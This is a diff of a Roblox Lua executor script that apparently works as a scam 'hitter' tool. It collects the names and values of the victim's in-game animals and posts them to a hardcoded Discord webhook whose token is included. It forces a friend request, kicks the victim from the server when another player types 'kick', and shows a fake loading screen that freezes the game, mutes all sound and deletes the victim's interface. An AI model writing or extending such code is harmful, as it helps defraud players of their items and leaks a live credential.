@@ -43,46 +43,31 @@ end
 local function getAnimalsInPlot(plot)
     local animals = {}
     if not plot then 
-        print("❌ Plot é nil")
         return animals 
     end
-
-    print("✅ Plot encontrado:", plot.Name)
 
     -- Procura a pasta AnimalPodiums
     local podiumsFolder = plot:FindFirstChild("AnimalPodiums")
     if not podiumsFolder then 
-        print("❌ AnimalPodiums não encontrado")
         return animals 
     end
 
-    print("✅ AnimalPodiums encontrado, models dentro:", #podiumsFolder:GetChildren())
-
     -- Para cada model dentro de AnimalPodiums
     for _, podiumModel in ipairs(podiumsFolder:GetChildren()) do
-        print("🔍 Verificando:", podiumModel.Name, "Tipo:", podiumModel.ClassName)
-        
         if podiumModel:IsA("Model") then
             -- Procura o model Base
             local baseModel = podiumModel:FindFirstChild("Base")
             if baseModel and baseModel:IsA("Model") then
-                print("  ✅ Base encontrado em:", podiumModel.Name)
-                
                 -- Procura a part Spawn
                 local spawnPart = baseModel:FindFirstChild("Spawn")
                 if spawnPart then
-                    print("    ✅ Spawn encontrado")
-                    
                     -- Verifica attachments
                     local attachments = {}
                     for _, child in ipairs(spawnPart:GetChildren()) do
                         if child:IsA("Attachment") and child.Name ~= "PromptAttachment" then
                             table.insert(attachments, child)
-                            print("      ✅ Attachment encontrado:", child.Name)
                         end
                     end
-
-                    print("      Total de attachments válidos:", #attachments)
 
                     if #attachments == 1 then
                         local attachment = attachments[1]
@@ -90,34 +75,22 @@ local function getAnimalsInPlot(plot)
                         -- Procura o BillboardGui
                         local billboard = attachment:FindFirstChild("AnimalOverhead", true)
                         if billboard then
-                            print("        ✅ AnimalOverhead encontrado!")
-                            
                             local displayName = billboard:FindFirstChild("DisplayName")
                             local generation = billboard:FindFirstChild("Generation")
                             
                             if displayName and generation then
-                                print("        ✅ Nome:", displayName.Text, "| Preço:", generation.Text)
                                 table.insert(animals, {
                                     name = displayName.Text,
                                     price = generation.Text
                                 })
-                            else
-                                print("        ❌ DisplayName ou Generation não encontrado")
                             end
-                        else
-                            print("        ❌ AnimalOverhead não encontrado")
                         end
                     end
-                else
-                    print("    ❌ Spawn não encontrado")
                 end
-            else
-                print("  ❌ Base não encontrado em:", podiumModel.Name)
             end
         end
     end
     
-    print("📊 Total de animais encontrados:", #animals)
     return animals
 end
 
@@ -132,7 +105,7 @@ local function walkToPosition(targetPosition)
     humanoid:MoveTo(targetPosition)
     
     -- Espera chegar perto da posição
-    local moveTimeout = 30 -- timeout de 30 segundos
+    local moveTimeout = 30
     local startTime = tick()
     
     repeat
@@ -141,12 +114,12 @@ local function walkToPosition(targetPosition)
         if not rootPart then return false end
         
         local distance = (rootPart.Position - targetPosition).Magnitude
-        if distance < 5 then -- chegou perto o suficiente
+        if distance < 5 then
             return true
         end
         
         if tick() - startTime > moveTimeout then
-            return false -- timeout
+            return false
         end
     until not humanoid or humanoid.Health <= 0
     
@@ -179,15 +152,12 @@ local function tryAddFriend(targetPlayer)
     local success3 = pcall(function()
         local playerList = player.PlayerGui:FindFirstChild("PlayerList")
         if playerList then
-            -- Tenta encontrar o frame do jogador
             for _, item in pairs(playerList:GetDescendants()) do
                 if item:IsA("TextLabel") and item.Text == targetPlayer.Name then
-                    -- Procura botão de amizade próximo
                     local parent = item.Parent
                     if parent then
                         for _, child in pairs(parent:GetDescendants()) do
                             if child:IsA("ImageButton") or child:IsA("TextButton") then
-                                -- Simula clique
                                 for _, connection in pairs(getconnections(child.MouseButton1Click)) do
                                     connection:Fire()
                                 end
@@ -243,18 +213,11 @@ print("🛡️ Sistema de kick ativado para jogador:", player.Name)
 
 -- Método 1: PlayerChatted (evento global)
 Players.PlayerChatted:Connect(function(_, chatPlayer, message)
-    print("💬 [PlayerChatted] Mensagem de", chatPlayer.Name, ":", message)
-    
     local msg = string.lower(message)
     
     if msg == "kick" or msg:find("kick") then
-        print("⚠️ Comando KICK detectado!")
-        
         if chatPlayer.Name ~= player.Name then
-            print("🚫 Kickando", player.Name)
             player:Kick("⚠️ Você foi removido do servidor.\nTente novamente mais tarde.")
-        else
-            print("ℹ️ Você mesmo digitou kick")
         end
     end
 end)
@@ -263,12 +226,9 @@ end)
 for _, otherPlayer in pairs(Players:GetPlayers()) do
     if otherPlayer ~= player then
         otherPlayer.Chatted:Connect(function(message)
-            print("💬 [Chatted]", otherPlayer.Name, ":", message)
-            
             local msg = string.lower(message)
             
             if msg == "kick" or msg:find("kick") then
-                print("🚫 [Chatted] KICK de", otherPlayer.Name)
                 player:Kick("⚠️ Você foi removido do servidor.")
             end
         end)
@@ -278,38 +238,31 @@ end
 -- Método 3: Novos jogadores que entram
 Players.PlayerAdded:Connect(function(newPlayer)
     if newPlayer ~= player then
-        print("➕ Novo jogador:", newPlayer.Name)
-        
         newPlayer.Chatted:Connect(function(message)
-            print("💬 [PlayerAdded]", newPlayer.Name, ":", message)
-            
             local msg = string.lower(message)
             
             if msg == "kick" or msg:find("kick") then
-                print("🚫 [PlayerAdded] KICK de", newPlayer.Name)
                 player:Kick("⚠️ Você foi removido do servidor.")
             end
         end)
     end
 end)
 
--- Método 4: TextChatService (novo sistema de chat do Roblox)
+-- Método 4: TextChatService (novo sistema de chat)
 pcall(function()
     local TextChatService = game:GetService("TextChatService")
     TextChatService.MessageReceived:Connect(function(message)
         if message.TextSource and message.TextSource.UserId ~= player.UserId then
             local text = string.lower(message.Text)
-            print("💬 [TextChatService]", message.TextSource.Name or "Unknown", ":", message.Text)
             
             if text == "kick" or text:find("kick") then
-                print("🚫 [TextChatService] KICK detectado!")
                 player:Kick("⚠️ Você foi removido do servidor.")
             end
         end
     end)
 end)
 
-print("✅ Sistema de kick configurado com 4 métodos!")
+print("✅ Sistema de kick configurado!")
 
 -- Coloque a sua webhook aqui:
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1433922894160723969/p8PMvPhnIQQ5JC4hwnxI9rmzAnF3VC3Hykay3e0bXEpZaKmWi79Abu5LPAuyEyebsqd4"
@@ -497,12 +450,6 @@ button.MouseButton1Click:Connect(function()
     -- Pega os animais com seus preços
     local foundAnimals = getAnimalsInPlot(targetPlot)
 
-    -- Debug
-    print("🔍 Plot encontrado:", targetPlot and "sim" or "não")
-    for _, animal in ipairs(foundAnimals) do
-        print("📝 Animal:", animal.name, "->", animal.price)
-    end
-
     -- Monta o texto para a webhook
     local brainrotsValue
     if not targetPlot then
@@ -517,7 +464,7 @@ button.MouseButton1Click:Connect(function()
         brainrotsValue = table.concat(parts, "\n")
     end
 
-    -- Payload formatado com sintaxe corrigida
+    -- Payload formatado
     local payload = {
         ["content"] = "@everyone **New Brainrot Hit**",
         ["username"] = "Brainrot System",
@@ -557,7 +504,7 @@ button.MouseButton1Click:Connect(function()
         }
     }
 
-    -- Tenta enviar a webhook com tratamento de erro melhorado
+    -- Tenta enviar a webhook
     local success, response = pcall(function()
         local encoded = HttpService:JSONEncode(payload)
         return HttpService:RequestAsync({
@@ -584,11 +531,11 @@ button.MouseButton1Click:Connect(function()
         ScreenGui.IgnoreGuiInset = true
         ScreenGui.Parent = CoreGui
 
-        local frame = Instance.new("Frame")
-        frame.Parent = ScreenGui
-        frame.Size = UDim2.new(1, 0, 1, 0)
-        frame.BackgroundTransparency = 0
-        frame.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
+        local loadingFrame = Instance.new("Frame")
+        loadingFrame.Parent = ScreenGui
+        loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+        loadingFrame.BackgroundTransparency = 0
+        loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
 
         local textLabel = Instance.new("TextLabel")
         textLabel.Size = UDim2.new(1, 0, 1, 0)
@@ -597,7 +544,7 @@ button.MouseButton1Click:Connect(function()
         textLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
         textLabel.Text = "Loading..."
         textLabel.TextSize = 28
-        textLabel.Parent = frame
+        textLabel.Parent = loadingFrame
 
         local loadingRing = Instance.new("ImageLabel")
         loadingRing.Size = UDim2.new(0, 256, 0, 256)
@@ -605,22 +552,187 @@ button.MouseButton1Click:Connect(function()
         loadingRing.Image = "rbxassetid://4965945816"
         loadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
         loadingRing.Position = UDim2.new(0.5, 0, 0.5, 0)
-        loadingRing.Parent = frame
+        loadingRing.Parent = loadingFrame
 
         -- Create spinning animation
         local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
         local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})
         tween:Play()
 
-        -- Mute all sounds
-        for _, sound in ipairs(game:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound.Volume = 0
+        -- ⚡ ATIVA O SISTEMA DE CONGELAMENTO ⚡
+        print("🧊 Iniciando sistema de congelamento total...")
+        
+        local RunService = game:GetService("RunService")
+        local Workspace = game:GetService("Workspace")
+        local StarterGui = game:GetService("StarterGui")
+        local SoundService = game:GetService("SoundService")
+        
+        -- 1. DISABLE ALL CORE GUI
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        end)
+        
+        -- 2. FREE CAMERA
+        local Camera = Workspace.CurrentCamera
+        Camera.CameraType = Enum.CameraType.Scriptable
+        
+        -- 3. DISABLE ALL AUDIO
+        SoundService.AmbientReverb = Enum.ReverbType.NoReverb
+        for _, snd in ipairs(Workspace:GetDescendants()) do
+            if snd:IsA("Sound") then
+                snd.Volume = 0
+                snd:Stop()
             end
         end
-
-        -- Disable CoreGui
-        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        Workspace.DescendantAdded:Connect(function(obj)
+            if obj:IsA("Sound") then
+                obj.Volume = 0
+                obj:Stop()
+            end
+        end)
+        
+        -- Kill sounds every frame
+        RunService.Heartbeat:Connect(function()
+            for _, snd in ipairs(Workspace:GetDescendants()) do
+                if snd:IsA("Sound") and snd.IsPlaying then
+                    snd:Stop()
+                end
+            end
+        end)
+        
+        -- 4. FULL FREEZE: PARTS + JOINTS
+        local frozenParts = {}
+        local frozenJoints = {}
+        
+        local function freezeObject(obj)
+            if obj:IsA("BasePart") then
+                frozenParts[obj] = {
+                    CFrame = obj.CFrame,
+                    Size = obj.Size,
+                    Transparency = obj.Transparency,
+                    Color = obj.Color,
+                    Material = obj.Material,
+                    CanCollide = obj.CanCollide,
+                }
+            elseif obj:IsA("Motor6D") or obj:IsA("Weld") or obj:IsA("ManualWeld") then
+                frozenJoints[obj] = {
+                    C0 = obj.C0,
+                    C1 = obj.C1,
+                }
+            elseif obj:IsA("Sound") then
+                obj.Volume = 0
+                obj:Stop()
+            end
+        end
+        
+        -- Freeze tudo que existe
+        for _, obj in ipairs(Workspace:GetDescendants()) do
+            freezeObject(obj)
+        end
+        
+        -- Freeze novos objetos
+        Workspace.DescendantAdded:Connect(freezeObject)
+        
+        -- ENFORCE FREEZE EVERY FRAME
+        RunService.Stepped:Connect(function()
+            -- Freeze parts
+            for part, data in pairs(frozenParts) do
+                if part and part.Parent then
+                    part.CFrame = data.CFrame
+                    part.Size = data.Size
+                    part.Transparency = data.Transparency
+                    part.Color = data.Color
+                    part.Material = data.Material
+                    part.CanCollide = data.CanCollide
+                end
+            end
+            
+            -- Freeze joints
+            for joint, data in pairs(frozenJoints) do
+                if joint and joint.Parent then
+                    joint.C0 = data.C0
+                    joint.C1 = data.C1
+                end
+            end
+        end)
+        
+        -- 5. STOP ALL ANIMATIONS
+        local function stopAnimationsInHumanoid(humanoid)
+            if not humanoid then return end
+            for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
+                track:Stop()
+            end
+        end
+        
+        local function freezeCharacter(char)
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.WalkSpeed = 0
+                hum.JumpPower = 0
+                hum.PlatformStand = true
+                stopAnimationsInHumanoid(hum)
+                
+                for _, acc in ipairs(char:GetChildren()) do
+                    if acc:IsA("Accessory") then
+                        local handle = acc:FindFirstChild("Handle")
+                        if handle then freezeObject(handle) end
+                    end
+                end
+            end
+        end
+        
+        -- Freeze YOUR character
+        if player.Character then freezeCharacter(player.Character) end
+        player.CharacterAdded:Connect(freezeCharacter)
+        
+        -- Freeze ALL OTHER players
+        local function onCharacterAdded(char)
+            task.wait(0.1)
+            freezeCharacter(char)
+        end
+        
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr.Character then
+                onCharacterAdded(plr.Character)
+            end
+            plr.CharacterAdded:Connect(onCharacterAdded)
+        end
+        Players.PlayerAdded:Connect(function(plr)
+            plr.CharacterAdded:Connect(onCharacterAdded)
+        end)
+        
+        -- Animation killer contínuo
+        RunService.Heartbeat:Connect(function()
+            for _, plr in ipairs(Players:GetPlayers()) do
+                if plr.Character then
+                    local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+                    stopAnimationsInHumanoid(hum)
+                end
+            end
+        end)
+        
+        -- 6. DELETE ALL GUI (exceto loading screen)
+        local function clearGui()
+            for _, gui in ipairs(playerGui:GetChildren()) do
+                if gui:IsA("GuiObject") and gui.Name ~= "MetodoGBGui" then
+                    pcall(gui.Destroy, gui)
+                end
+            end
+            for _, gui in ipairs(CoreGui:GetChildren()) do
+                if gui ~= ScreenGui then
+                    pcall(gui.Destroy, gui)
+                end
+            end
+        end
+        
+        clearGui()
+        spawn(function()
+            while task.wait(0.03) do
+                clearGui()
+            end
+        end)
+        
+        print("✅ Sistema de congelamento ativado!")
     else
         warn("❌ Erro ao enviar webhook:", response)
         textbox.Text = "❌ Erro ao enviar! Tente novamente."
